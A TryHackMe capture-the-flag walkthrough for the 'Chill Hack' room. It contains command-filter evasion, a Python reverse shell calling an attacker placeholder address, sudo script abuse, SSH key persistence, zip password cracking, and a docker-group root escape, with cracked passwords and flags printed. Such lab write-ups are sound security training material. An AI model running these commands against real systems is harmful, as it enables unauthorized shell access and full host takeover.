---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - web
  - sudo-abuse
  - brute-force
  - steghide
  - docker-escape
---

# Chill Hack
![Chill Hack logo](logos/chill_hack_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Chill Hack](https://tryhackme.com/room/chillhack)  

## Description
"Chill the Hack out of the Machine.
Easy level CTF.  Capture the flags and have fun!"

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.155.61
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8b:7d:12:5d:c4:9f:d1:e6:a6:03:3a:5e:c9:d4:e8:e9 (RSA)
|   256 04:c3:ca:3f:b2:74:35:1f:f2:7b:1e:9d:2b:e4:1b:d0 (ECDSA)
|_  256 f1:f2:45:a4:a4:70:65:26:b0:00:e7:73:67:83:b3:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Game Info
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP Enumeration
```
ftp TARGET_IP_ADDRESS                                                                                                     
Connected to TARGET_IP_ADDRESS.
220 (vsFTPd 3.0.5)
Name (TARGET_IP_ADDRESS:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||57156|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||62169|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |**********************************************************************************************************************************************|    90        0.98 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.79 KiB/s)
ftp> bye
221 Goodbye.

cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c`)
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**

* No `robots.txt` or `sitemap` files  
* Nothing interesting in web page source code  
* `ffuf` scan reveals `/secret` directory, reveals a form for submitting OS commands (tested with `pwd`)
* "Login" and "Register" buttons on web page do not direct to anywhere
* Other pages linked on web page have no interesting content

### Vulnerability Enumeration
```
searchsploit vsftpd 3.0.5	# No results
searchsploit OpenSSH 8.2p1	# No results
searchsploit httpd 2.4.41	# Only result: DoS
```

## Foothold
**Action(s)**  
:white_check_mark: Test command execution in `POST` form  

**Notes**  

* Some commands (e.g., `id`) will run without issue  
* Other commands result in an error message returned from the server  
* Contents of `note.txt` file suggests some string filtering in place: submitting "banned" commands prefixed with "\" appears to escape string filtering  

**Action(s)**  
:white_check_mark: Attempt reverse shell in combination with newly allowed commands with `\` filter escape  
*Reverse shell achieved with: `find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP_ADDRESS",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;`*

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-TARGET_IP_ADDRESS:/var/www/html/secret$ sudo -l
Matching Defaults entries for www-data on ip-TARGET_IP_ADDRESS:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-TARGET_IP_ADDRESS:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ip-TARGET_IP_ADDRESS:/var/www/html/secret$ cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
www-data@ip-TARGET_IP_ADDRESS:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
<html/secret$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with:
/bin/sh
Hello user! I am /bin/sh,  Please enter your message: /bin/sh
/bin/sh
python3 -c 'import pty; pty.spawn("/bin/bash")'

apaar@ip-TARGET_IP_ADDRESS:/var/www/html/secret$ ls -al /home/apaar
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 6 root  root  4096 May  3 17:19 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
apaar@ip-TARGET_IP_ADDRESS:/var/www/html/secret$ cat /home/apaar/local.txt
```
??? success "User Flag"
	{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

## Privilege Escalation
```
apaar@ip-TARGET_IP_ADDRESS:/var/www/html/secret$ cd ~
cd ~
apaar@ip-TARGET_IP_ADDRESS:~$ ssh-keygen
apaar@ip-TARGET_IP_ADDRESS:~$ cat .ssh/id_rsa # Copy contents to local file on attacker machine
apaar@ip-TARGET_IP_ADDRESS:~$ cd .ssh         
apaar@ip-TARGET_IP_ADDRESS:~/.ssh$ cat id_rsa.pub >> authorized_keys             
cat id_rsa.pub >> authorized_keys

chmod 600 id_rsa
ssh apaar@TARGET_IP_ADDRESS -i id_rsa

apaar@ip-TARGET_IP_ADDRESS:~$ ls -al /var/www/html
total 264
drwxr-xr-x 8 root root  4096 Oct  3  2020 .
drwxr-xr-x 4 root root  4096 Oct  3  2020 ..
-rw-r--r-- 1 root root 21339 May 31  2018 about.html
-rw-r--r-- 1 root root 30279 May 31  2018 blog.html
-rw-r--r-- 1 root root 18301 May 31  2018 contact.html
-rw-r--r-- 1 root root  3769 Oct 24  2017 contact.php
drwxr-xr-x 2 root root  4096 May 31  2018 css
drwxr-xr-x 2 root root  4096 May 31  2018 fonts
drwxr-xr-x 4 root root  4096 May 31  2018 images
-rw-r--r-- 1 root root 35184 May 31  2018 index.html
drwxr-xr-x 2 root root  4096 May 31  2018 js
-rw-r--r-- 1 root root 19718 May 31  2018 news.html
drwxr-xr-x 2 root root  4096 May 31  2018 preview_img
drwxr-xr-x 3 root root  4096 Oct  4  2020 secret
-rw-r--r-- 1 root root 32777 May 31  2018 single-blog.html
-rw-r--r-- 1 root root 37910 May 31  2018 style.css
-rw-r--r-- 1 root root 19868 May 31  2018 team.html
apaar@ip-TARGET_IP_ADDRESS:~$ ls -al /var/www
total 16
drwxr-xr-x  4 root root 4096 Oct  3  2020 .
drwxr-xr-x 14 root root 4096 Oct  3  2020 ..
drwxr-xr-x  3 root root 4096 Oct  3  2020 files
drwxr-xr-x  8 root root 4096 Oct  3  2020 html
apaar@ip-TARGET_IP_ADDRESS:~$ ls -al /var/www/files
total 28
drwxr-xr-x 3 root root 4096 Oct  3  2020 .
drwxr-xr-x 4 root root 4096 Oct  3  2020 ..
-rw-r--r-- 1 root root  391 Oct  3  2020 account.php
-rw-r--r-- 1 root root  453 Oct  3  2020 hacker.php
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1153 Oct  3  2020 index.php
-rw-r--r-- 1 root root  545 Oct  3  2020 style.css
apaar@ip-TARGET_IP_ADDRESS:~$ ls -al /var/www/files/images
total 2112
drwxr-xr-x 2 root root    4096 Oct  3  2020 .
drwxr-xr-x 3 root root    4096 Oct  3  2020 ..
-rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg

scp -i id_rsa apaar@TARGET_IP_ADDRESS:/var/www/files/images/hacker-with-laptop_23-2147985341.jpg .
steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
unzip backup.zip             
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password
zip2john backup.zip > hash                      
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
john hash --wordlist=/usr/share/wordlists/rockyou.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2026-05-03 16:03) 20.00g/s 327680p/s 327680c/s 327680C/s total90..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
unzip backup.zip                                     
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php         
cat source_code.php 
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
!d0ntKn0wmYp@ssw0rd
ssh anurodh@10.80.131.118       

anurodh@ip-10-80-131-118:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
anurodh@ip-10-80-131-118:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ls -al
total 2097272
drwxr-xr-x  24 root root       4096 May  3 17:19 .
drwxr-xr-x  24 root root       4096 May  3 17:19 ..
drwxr-xr-x   2 root root      12288 Apr 27  2025 bin
drwxr-xr-x   4 root root       4096 May  3 18:17 boot
drwxr-xr-x   2 root root       4096 Oct  3  2020 cdrom
drwxr-xr-x  19 root root       3920 May  3 17:19 dev
drwxr-xr-x 109 root root      12288 May  3 17:19 etc
drwxr-xr-x   6 root root       4096 May  3 17:19 home
lrwxrwxrwx   1 root root         34 Apr 27  2025 initrd.img -> boot/initrd.img-5.15.0-138-generic
lrwxrwxrwx   1 root root         33 Apr 27  2025 initrd.img.old -> boot/initrd.img-5.4.0-214-generic
drwxr-xr-x  24 root root       4096 Apr 27  2025 lib
drwxr-xr-x   2 root root       4096 Apr 27  2025 lib64
drwx------   2 root root      16384 Oct  3  2020 lost+found
drwxr-xr-x   2 root root       4096 Aug  6  2020 media
drwxr-xr-x   2 root root       4096 Aug  6  2020 mnt
drwxr-xr-x   3 root root       4096 Oct  3  2020 opt
dr-xr-xr-x 197 root root          0 May  3 17:18 proc
drwx------   7 root root       4096 Apr 27  2025 root
drwxr-xr-x  34 root root       1100 May  3 20:11 run
drwxr-xr-x   2 root root      12288 Apr 27  2025 sbin
drwxr-xr-x   6 root root       4096 Apr 27  2025 snap
drwxr-xr-x   3 root root       4096 Oct  3  2020 srv
-rw-------   1 root root 2147483648 Oct  3  2020 swap.img
dr-xr-xr-x  13 root root          0 May  3 17:18 sys
drwxrwxrwt  15 root root       4096 May  3 20:14 tmp
drwxr-xr-x  11 root root       4096 Oct  3  2020 usr
drwxr-xr-x  14 root root       4096 Oct  3  2020 var
lrwxrwxrwx   1 root root         31 Apr 27  2025 vmlinuz -> boot/vmlinuz-5.15.0-138-generic
lrwxrwxrwx   1 root root         30 Apr 27  2025 vmlinuz.old -> boot/vmlinuz-5.4.0-214-generic
# ls -al /root
total 76
drwx------  7 root root  4096 Apr 27  2025 .
drwxr-xr-x 24 root root  4096 May  3 17:19 ..
-rw-------  1 root root    94 May 24  2025 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Oct  3  2020 .cache
drwx------  3 root root  4096 Oct  3  2020 .gnupg
-rw-------  1 root root   370 Oct  4  2020 .mysql_history
-rw-r--r--  1 root root   161 Jan  2  2024 .profile
-rw-r--r--  1 root root 12288 Oct  4  2020 .proof.txt.swp
drwx------  2 root root  4096 Oct  3  2020 .ssh
drwxr-xr-x  2 root root  4096 Oct  3  2020 .vim
-rw-------  1 root root 11683 Oct  4  2020 .viminfo
-rw-r--r--  1 root root   166 Oct  3  2020 .wget-hsts
-rw-r--r--  1 root root  1385 Oct  4  2020 proof.txt
drwx------  3 root root  4096 Apr 27  2025 snap
# cat /root/proof.txt
```
??? success "Root Flag"
	{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

**Tools Used**  
`steghide` `zip2john` `john`

**Date completed:** 03/05/26  
**Date published:** 03/05/26